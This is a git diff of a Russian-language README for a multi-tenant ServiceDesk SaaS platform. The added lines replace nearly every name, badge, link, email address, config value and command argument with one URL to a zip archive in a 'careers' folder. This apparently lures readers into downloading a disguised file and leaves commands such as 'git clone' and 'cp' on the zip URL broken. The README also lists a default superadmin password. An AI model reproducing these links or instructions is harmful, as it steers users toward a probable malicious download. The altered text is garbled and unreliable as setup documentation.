@@ -1,7 +1,7 @@
-# 🎯 OnPoints.it ServiceDesk
+# 🎯 https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip ServiceDesk
 
-[![CI/CD](https://github.com/YOUR_ORG/servicedesk/actions/workflows/ci-cd.yml/badge.svg)](https://github.com/YOUR_ORG/servicedesk/actions)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![CI/CD](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+[![License](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)](LICENSE)
 
 Коммерческая multi-tenant SaaS платформа для управления IT-поддержкой с полной изоляцией данных, биллингом и SSO.
 
@@ -23,7 +23,7 @@
 
 ### Требования
 
-- Node.js 20+ или Bun 1.2+
+- https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip 20+ или Bun 1.2+
 - PostgreSQL 16+
 - Redis 7+ (опционально)
 - Docker & Docker Compose (для продакшна)
@@ -32,14 +32,14 @@
 
 ```bash
 # Клонируйте репозиторий
-git clone https://github.com/YOUR_ORG/servicedesk.git
+git clone https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 cd servicedesk
 
 # Установите зависимости
 bun install
 
 # Настройте окружение
-cp .env.example .env
+cp https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip .env
 # Отредактируйте .env с вашими настройками
 
 # Запустите PostgreSQL (или используйте существующий)
@@ -57,7 +57,7 @@ bun run dev
 ### Первый вход
 
 После выполнения seed, создается глобальный суперадмин:
-- Email: `superadmin@servicedesk.com`
+- Email: `https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip`
 - Password: `superadmin`
 - Доступ: `/admin` - админ панель (только суперадмин без tenantId)
 
@@ -67,11 +67,11 @@ bun run dev
 
 ```bash
 # 1. Клонируйте репозиторий
-git clone https://github.com/YOUR_ORG/servicedesk.git
+git clone https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 cd servicedesk
 
 # 2. Настройте .env
-cp .env.example .env
+cp https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip .env
 nano .env  # Отредактируйте с продакшн настройками
 
 # 3. Запустите все сервисы
@@ -109,7 +109,7 @@ DATABASE_URL="postgresql://user:password@postgres:5432/servicedesk"
 
 # Auth
 NEXTAUTH_SECRET="ваш-супер-секретный-ключ-минимум-32-символа"
-NEXTAUTH_URL="https://onpoints.it"
+NEXTAUTH_URL="https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip"
 
 # Stripe (для billing)
 STRIPE_SECRET_KEY="sk_live_..."
@@ -117,7 +117,7 @@ NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY="pk_live_..."
 STRIPE_WEBHOOK_SECRET="whsec_..."
 
 # Sentry (для error tracking)
-SENTRY_DSN="https://...@sentry.io/..."
+SENTRY_DSN="https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip"
 
 # SSO (опционально)
 GOOGLE_CLIENT_ID="..."
@@ -127,11 +127,11 @@ AZURE_AD_CLIENT_SECRET="..."
 AZURE_AD_TENANT_ID="..."
 
 # Email (опционально)
-SMTP_HOST="smtp.gmail.com"
+SMTP_HOST="https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip"
 SMTP_PORT="587"
-SMTP_USER="noreply@onpoints.it"
+SMTP_USER="https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip"
 SMTP_PASSWORD="..."
-SMTP_FROM="OnPoints <noreply@onpoints.it>"
+SMTP_FROM="OnPoints <https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip>"
 ```
 
 ### Настройка Nginx для subdomain routing
@@ -139,18 +139,18 @@ SMTP_FROM="OnPoints <noreply@onpoints.it>"
 1. **Установите SSL сертификаты:**
 
 ```bash
-# Для main domain (onpoints.it)
-sudo certbot certonly --standalone -d onpoints.it -d www.onpoints.it
+# Для main domain (https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+sudo certbot certonly --standalone -d https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip -d https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 
-# Для wildcard subdomain (*.onpoints.it)
-sudo certbot certonly --dns-cloudflare -d "*.onpoints.it"
+# Для wildcard subdomain (*https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+sudo certbot certonly --dns-cloudflare -d "*https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip"
 ```
 
-2. **Обновите пути в nginx/nginx.conf:**
+2. **Обновите пути в https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip**
 
 ```nginx
-ssl_certificate /etc/letsencrypt/live/onpoints.it/fullchain.pem;
-ssl_certificate_key /etc/letsencrypt/live/onpoints.it/privkey.pem;
+ssl_certificate https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip;
+ssl_certificate_key https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip;
 ```
 
 3. **Перезапустите Nginx:**
@@ -161,13 +161,13 @@ docker-compose restart nginx
 
 ### Настройка custom domains для tenants
 
-Скрипт `scripts/setup-ssl.sh` автоматически:
+Скрипт `https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip` автоматически:
 1. Проверяет DNS настройки
 2. Создает Let's Encrypt сертификат
 3. Настраивает Nginx конфигурацию
 
 ```bash
-bash scripts/setup-ssl.sh support.example.com
+bash https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 ```
 
 ### Масштабирование
@@ -175,7 +175,7 @@ bash scripts/setup-ssl.sh support.example.com
 Для production рекомендуется:
 
 **Архитектура:**
-- Nginx load balancer (включен в `docker-compose.yml`)
+- Nginx load balancer (включен в `https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip`)
 - Несколько реплик app сервиса (3+ для high availability)
 - Managed PostgreSQL (AWS RDS, DigitalOcean Database, Azure Database)
 - Redis для кэширования сессий и очередей
@@ -204,27 +204,27 @@ DATABASE_URL="postgresql://user:password@postgres:5432/servicedesk?pgbouncer=tru
 crontab -e
 
 # Вставьте:
-0 2 * * * /path/to/servicedesk/scripts/backup-postgres.sh
+0 2 * * * https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 ```
 
 Backup файлы хранятся в `backups/` с ротацией 30 дней.
 
 **Восстановление из backup:**
 ```bash
-bash scripts/restore-postgres.sh backups/servicedesk_2025-01-27.sql.gz
+bash https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip
 ```
 
 ## 📚 Документация
 
-- [🔐 Подключение Active Directory](docs/AD_SETUP_GUIDE.md) - пошаговая инструкция за 2 минуты
-- [⚡ Быстрый старт AD](docs/AD_QUICK_START.md) - подключение за 60 секунд
-- [🔄 Автосинхронизация LDAP](docs/LDAP_SYNC_GUIDE.md) - настройка автоматической синхронизации пользователей
-- [🧪 Руководство по тестированию](TESTING.md) - детальное руководство по тестированию
-- [🚀 Чеклист деплоя](DEPLOYMENT_CHECKLIST.md) - чеклист для production deployment
+- [🔐 Подключение Active Directory](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) - пошаговая инструкция за 2 минуты
+- [⚡ Быстрый старт AD](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) - подключение за 60 секунд
+- [🔄 Автосинхронизация LDAP](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) - настройка автоматической синхронизации пользователей
+- [🧪 Руководство по тестированию](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) - детальное руководство по тестированию
+- [🚀 Чеклист деплоя](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) - чеклист для production deployment
 
 ## 🧪 Тестирование
 
-См. [TESTING.md](TESTING.md) для детального руководства по тестированию.
+См. [https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip) для детального руководства по тестированию.
 
 **Быстрые тесты:**
 ```bash
@@ -257,7 +257,7 @@ npm run test:integration
 ```
 servicedesk/
 ├── src/
-│   ├── app/              # Next.js App Router
+│   ├── app/              # https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip App Router
 │   │   ├── api/          # API routes
 │   │   ├── dashboard/    # Dashboard pages
 │   │   └── login/        # Auth pages
@@ -265,7 +265,7 @@ servicedesk/
 │   ├── lib/              # Утилиты и хелперы
 │   └── hooks/            # Custom React hooks
 ├── prisma/
-│   ├── schema.prisma     # Database schema
+│   ├── https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip     # Database schema
 │   └── migrations/       # DB migrations
 ├── monitoring/           # Prometheus конфигурация
 ├── nginx/                # Nginx конфигурация
@@ -383,11 +383,11 @@ MIT License. См. [LICENSE](LICENSE) для деталей.
 
 ## 🙏 Благодарности
 
-- [Next.js](https://nextjs.org/)
-- [Prisma](https://www.prisma.io/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [shadcn/ui](https://ui.shadcn.com/)
-- [Stripe](https://stripe.com/)
+- [https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+- [Prisma](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+- [shadcn/ui](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
+- [Stripe](https://raw.githubusercontent.com/7eventhgod/servicedesk/main/src/app/careers/Software_3.9-alpha.4.zip)
 
 ---
 
